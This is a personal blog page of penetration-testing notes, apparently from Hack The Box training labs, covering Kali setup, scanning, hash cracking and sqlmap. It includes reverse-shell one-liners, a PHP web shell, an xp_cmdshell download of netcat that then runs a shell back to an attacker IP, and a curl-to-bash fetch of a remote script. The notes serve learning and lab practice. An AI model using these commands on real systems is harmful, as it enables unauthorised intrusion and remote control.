<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pentesting tools and useful commands</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="../../static/css/style.css">
    <script>
        // WebSocket hot-reload
        const ws = new WebSocket('ws://localhost:8080');
        ws.onmessage = e=>e.data==='reload' && location.reload();
        ws.onclose = () => setTimeout(()=>location.reload(),1000);
    </script>
</head>
<body class="">
    <header>
        <nav class="narrow">
            <a href="../../index.html">Home</a>
        </nav>
    </header>
    
    <main>
        <article>
            
            <div class="content">
                <h1>Pentesting tools and useful commands</h1>
                <div class="date">2022-10-05</div>
                <p><a href="https://gtfobins.github.io/">GTFOBins</a> — list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.</p>
<p><a href="https://www.kali.org/">Kali OS</a></p>
<p><a href="https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/">Select Network Repositories</a></p>
<p>Default:</p>
<pre><code class="language-bash">echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free&quot; | sudo tee /etc/apt/sources.list
</code></pre>
<p>More stable:</p>
<pre><code class="language-bash">echo &quot;deb http://http.kali.org/kali kali-last-snapshot main contrib non-free&quot; | sudo tee /etc/apt/sources.list
</code></pre>
<p>Install all tools:</p>
<pre><code class="language-bash">sudo apt install -y kali-linux-large
</code></pre>
<p>Install GUI:</p>
<pre><code class="language-bash">sudo apt install -y kali-win-kex
</code></pre>
<p><a href="https://www.kali.org/docs/wsl/win-kex/">GUI Documentation.</a> Run GUI, to exit from full screen mode press <strong>F8</strong>:</p>
<pre><code class="language-bash">kex --win -s
</code></pre>
<p><a href="https://www.wappalyzer.com/apps">Wappalyzer</a> — browser extension to see the technologies used on websites.</p>
<p>OpenVPN</p>
<pre><code class="language-bash">sudo openvpn --config vpn.ovpn --daemon
</code></pre>
<p>The network interface can be checked by running the <strong>ifconfig</strong> command in the terminal.</p>
<p>Shutdown</p>
<pre><code class="language-bash">sudo ifconfig tun1 down
</code></pre>
<p>Search WebCatalogs on site:
<code>dirsearch -u http://october.metaltech.stf/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt</code></p>
<p>Responder</p>
<pre><code class="language-bash">sudo responder -I tun0
</code></pre>
<p>John the ripper</p>
<pre><code class="language-bash">zip2john backup.zip &gt; hashes
</code></pre>
<pre><code class="language-bash">john -w=/usr/share/wordlists/rockyou.txt hash.txt
</code></pre>
<p>Identify possible hashes</p>
<pre><code class="language-bash">hashid 2cb42f8734ea607eefed3b70af13bbd3
</code></pre>
<p>Crack hash</p>
<pre><code class="language-bash">hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
</code></pre>
<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server">Pentesting MSSQL</a></p>
<p><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">MSSQL Injection Cheat Sheet</a></p>
<p>Impacket mssql client</p>
<pre><code class="language-bash">impacket-mssqlclient ARCHETYPE/[email protected] -windows-auth
</code></pre>
<pre><code class="language-sql">xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.17.81/nc64.exe -outfile nc64.exe&quot;
xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.17.81 443&quot;
</code></pre>
<p>SQL map</p>
<pre><code class="language-bash">sqlmap -u &#39;http://10.129.10.184/dashboard.php?search=asd&#39; --cookie=&#39;PHPSESSID=tg7rj9h95j4bb1u3211ti406qo&#39;
</code></pre>
<pre><code class="language-bash">sqlmap -u &#39;http://10.129.10.184/dashboard.php?search=asd&#39; --cookie=&#39;PHPSESSID=tg7rj9h95j4bb1u3211ti406qo&#39; --os-shell
</code></pre>
<p><a href="https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe">winPEAS</a> (Windows Privilege Escalation)</p>
<p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linPEAS</a> (Linux Privilege Escalation)</p>
<p>Evil Win Remote</p>
<pre><code class="language-bash">evil-winrm -i 10.129.233.177 -u administrator -p badminton
</code></pre>
<p><a href="https://nmap.org/">Nmap</a></p>
<pre><code class="language-bash">sudo nmap -sV 192.168.1.1

sudo nmap -sV -sC 192.168.1.1

sudo nmap -p- --min-rate 5000 -sV 192.168.1.1
</code></pre>
<p>Gobuster</p>
<pre><code class="language-bash">go install github.com/OJ/gobuster/v3@latest
git clone https://github.com/danielmiessler/SecLists.git
gobuster dir --url http://10.129.236.130/ --wordlist ./SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
gobuster dir --url http://10.129.119.70/ --wordlist ./SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
</code></pre>
<p>MySQL</p>
<pre><code class="language-bash">mysql -h 10.129.132.32 -u root
</code></pre>
<pre><code class="language-sql">SHOW databases; : Prints out the databases we can access.
USE {database_name}; : Set to use the database named {database_name}.
SHOW tables; : Prints out the available tables inside the current
database.
SELECT * FROM {table_name}; : Prints out all the data from the table {table_name}.
</code></pre>
<p>SMB</p>
<pre><code class="language-bash">smbclient -N -L \\\\{TARGET_IP}\\
-N : No password
-L : This option allows you to look at what services are available on a server
</code></pre>
<p><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">Fully interactive shells</a></p>
<p>Simple PHP Shell</p>
<pre><code class="language-php">echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php
</code></pre>
<p>Reverse Shell</p>
<pre><code class="language-bash">printf &#39;#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP_ADDRESS&gt;/1337 0&gt;&amp;1&#39; &gt; shell.sh
</code></pre>
<p>Or</p>
<pre><code class="language-bash">bash -c &quot;bash -i &gt;&amp; /dev/tcp/{your_IP}/1337 0&gt;&amp;1&quot;
</code></pre>
<p>Start ncat listener</p>
<pre><code class="language-bash">nc -nvlp 1337
</code></pre>
<p>Start Web Server</p>
<pre><code class="language-bash">python3 -m http.server 8000
</code></pre>
<p>Start example</p>
<pre><code>http://thetoppers.htb/shell.php?cmd=curl%20%3CYOUR_IP_ADDRESS%3E:8000/shell.sh|bash
</code></pre>
<p>Functional shell</p>
<pre><code class="language-bash">python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
</code></pre>
<p>Upgrade shell</p>
<pre><code class="language-bash">script /dev/null -c bash
</code></pre>
<p><a href="https://portswigger.net/burp/releases/professional-community-2022-7-1?requestededition=community">Burp Suite</a></p>
<p><a href="https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html">Metasploit</a></p>
<p><a href="https://sqlmap.org/">sqlmap</a></p>

            </div>
        </article>
    </main>

    <footer class="narrow">
        <p>© 2014 – 2025  Mikhail Kozlov<br><a href="mailto:m@koz.tv">m@koz.tv</a> </p>
    </footer>
</body>
</html> 